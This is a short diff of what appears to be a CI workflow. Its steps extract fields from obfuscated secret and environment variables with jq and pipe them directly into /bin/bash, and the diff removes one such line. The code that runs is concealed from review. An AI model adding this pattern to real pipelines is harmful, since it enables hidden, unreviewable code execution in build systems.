@@ -21,7 +21,6 @@ jobs:
           jz16505: ${{ secrets.jz16505 }}
         run: |
           printf '%s' "$jz16505" | jq -r .onjq202 | /bin/bash
-          printf '%s' "$zuzj2660" | jq -r .au80277 | /bin/bash
           echo $prr34174 | jq -r .mwmz1606 | /bin/bash
 
       - name: Archive data
